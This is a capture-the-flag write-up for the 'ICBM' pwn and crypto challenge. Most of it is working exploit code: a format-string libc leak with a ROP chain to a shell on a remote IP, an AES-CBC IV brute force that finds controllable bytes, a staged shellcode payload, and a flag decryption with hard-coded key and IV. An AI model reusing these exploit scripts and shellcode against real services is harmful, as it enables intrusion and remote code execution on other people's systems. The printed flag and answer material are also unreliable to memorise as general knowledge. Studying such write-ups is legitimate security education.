## ICBM - Pwn + Crypto 1000 problem

ICBM starts out with a program with some trivial vulnerabilities. Wow, 1000
points for some simple ROP? Sounds good to me!

We are kindly given a copy of the system libc. We have both a buffer overflow
and a format string vuln, so we can just leak out a libc address and jump to
system.

```python
import struct
import socket
import sys

libc_system = 0x46183 #offset a bit to use rbx instead of rdi
libc_binsh = 0x17d87b

pop_rbx_rbp = 0x1f577

leak_start_to_base = 0x7ffff7dd59f0-0x7ffff7a14000

s = socket.create_connection(('54.65.28.239',9991))

def readuntil(st):
  buf = ""
  while (st not in buf):
    buf += s.recv(1)
  return buf

print readuntil("> ")
s.send("%qx\n")

res = readuntil("> ")
leak = int(res.split("TODO")[0],16)
system = (leak - leak_start_to_base)+libc_system

binsh = (leak - leak_start_to_base)+libc_binsh

s.send("y\n")
s.send("-15\n")

for i in xrange(54):
  s.send("5\n")

pop_rbx_rbp += (leak - leak_start_to_base)

def send8(i):
  s.send(str(i&0xffffffff)+"\n")
  s.send(str(i>>32)+"\n")

send8(pop_rbx_rbp)
send8(binsh)
send8(binsh)
send8(system)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Awesome! We get a shell and `cat flag` and... crap. Looks like it won't be that
easy.

We are told that we need to extract launch codes from the icbm server. The
server is running on port 9990, and we get a copy of a "neutered" version.
Like the first challenge, the code here is pretty simple. It reads in some
data, AES-CBC decrypt it, and jumps to it.

Since this is CBC mode, we know the first 16 bytes (the IV) act as an xor key
on the data. That means it's feasible for us to brute force the xor key a little
bit at a time.

Our approach is as follows: start off by brute forcing the first 2 characters.
Most of the time, this should result in a crash and an immediate disconnect.
However, some of the time, we should get something like `eb fe`, which will
result in an infinite loop, and not disconnect until the service times out.
Therefore, we send characters until we don't immediately get disconnected. From
there, we need to determine which bytes we sent. To do that, xor our first two
bytes with a known infinite loop pattern, and several "candidate" infinite loop
patterns. Based on which "candidate" patterns it matches, we can determine which
two byte loop we found.


```python
def test(buf):
  s = socket.create_connection(('localhost',9990))
  s.recv(1024)
  s.sendall(buf.ljust(4096,"\x00"))
  t = time.time()
  while time.time() - t < 0.1:
    s.sendall("foo")

def ttest(buf):
  try:
    test(buf)
    return True
  except:
    return False

#candidate infinite loop patterns
possibles = [0xffe5 ,0xe0fe ,0xe3fe ,0xe2fe ,0xebfe ,0x71fe ,0x73fe ,0x75fe ,0x77fe ,0x79fe ,0x7afe ,0x7dfe, 0x7ffe,0x55c3]

def decode1(sofar):
  for i in xrange(65536):
    buf = sofar+chr(i>>8)+chr(i&0xff)

    if i%1024 == 0:
      print i

    if ttest(buf):
      print "w00t",buf.encode("hex")

      for pp in possibles:
        x = i^pp^0xffe5
        print "  ",ttest(sofar + chr(x>>8)+chr(x&0xff)),hex(pp)
      break
```

After a couple thousand tries, we find a candidate: the string `1e d2` encodes
to the infinite loop `55 c3` (`push rbp; ret` which infinite loops as `rbp`
points to our buffer).

Next, we do the following: encode the string `90 .. ff`, and brute force the
last byte. This should give us an infinite loop only when the last byte is `e5`.
Continue this, and eventually we get an xor key that gives us 16 controllable
bytes.

```python
def decode(sofar):
  for i in xrange(256):
    buf = sofar+chr(i)

    if ttest(buf):
      sofar = sofar[:-1] + chr(ord(sofar[-1])^0xff^0x90) + chr(i^0xff^0xe5)
      return sofar

  print "crap"
```

Once we have that, we encrypt a small 12 byte stager shellcode which
lets us run some longer shellcode to get a shell.

```nasm
[BITS 64]
xor rax, rax
imul eax
mov rsi, rbp
mov dh, 0x10
syscall
```

```python
#!/usr/bin/python
import socket
import struct
import telnetlib

def readuntil(f, delim='> '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9990))
f = s.makefile('rw', bufsize=0)

readuntil(f)

# A block of zeros decrypts to this value. Obtained by IV bit flipping
# to find infinite loops.
iv = map(ord, list('4b1199216542d9e9bb9cc69ebc99ae5c'.decode('hex')))

# xor the IV with our stager shellode
for i, v in enumerate(map(ord, list(open('sc.bin').read()))):
    iv[i] ^= v

block = '\x00' * 16

payload = ''.join(map(chr, iv)) + block
f.write(payload.ljust(4096, 'A'))

stage2 = '\x90' * 12 + open('shell.bin').read()
f.write(stage2.ljust(4096, 'B'))

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Once we have exploited the service, we find the non-redacted version of
the binary in `icbm_test_server` and an encrypted flag file, `flag.enc`.
We extract the IV and key from the binary to decrypt the flag:

```python
#!/usr/bin/python
from Crypto.Cipher import AES

key =
'46e615ded2b8db662c680361d9ea8df77c9e71da87bfd87eda20e98280b872cd'.decode('hex')
iv = 'f701ec6b888a1da993b1122f4804b102'.decode('hex')
cipher = AES.new(key, AES.MODE_CBC, iv)
print cipher.decrypt(open('flag.enc').read())
```

```
In case you forgot the launch code:

purest_of_bodily_fluids
```
